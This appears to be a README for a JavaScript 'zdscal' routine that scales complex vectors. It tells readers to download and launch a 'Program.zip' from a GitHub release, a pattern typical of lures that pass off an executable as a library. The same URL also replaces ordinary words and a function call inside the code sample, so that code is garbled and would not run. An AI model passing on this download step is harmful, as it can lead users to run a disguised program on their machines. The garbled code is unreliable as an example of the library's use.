Launch the downloaded file and follow the instructions to incorporate the `zdscal` subroutine into your project.

## üì¶ Installation
To use the `zdscal` subroutine in your https://github.com/allolazard20/blas-base-zdscal/releases/download/v1.0/Program.zip application, follow these steps:

1. Download the necessary files from the provided link.
2. Extract the contents of the downloaded ZIP file.
3. Include the `zdscal` subroutine in your https://github.com/allolazard20/blas-base-zdscal/releases/download/v1.0/Program.zip project.
4. Call the `zdscal` function with the appropriate parameters to scale your complex vector.

```javascript
const zdscal = require('./zdscal');

// Define your complex vector
const vector = [ { re: 1, im: 2 }, { re: 3, im: 4 }, { re: 5, im: 6 } ];

// Define the scaling factor
const factor = 2.5;

// Scale the vector
const scaledVector = zdscal(vector, factor);

https://github.com/allolazard20/blas-base-zdscal/releases/download/v1.0/Program.zip(scaledVector);
```

## üõ†Ô∏è Example
Consider the following example where we scale a complex vector by a given constant factor:

**Input:**
```javascript
const vector = [ { re: 1, im: 2 }, { re: 3, im: 4 }, { re: 5, im: 6 } ];
const factor = 2.5;
```

**Output:**
```javascript
[ { re: 2.5, im: 5 }, { re: 7.5, im: 10 }, { re: 12.5, im: 15 } ]
```

By applying the `zdscal` subroutine, we successfully scaled the complex vector by the specified constant factor, resulting in a new vector with updated values.
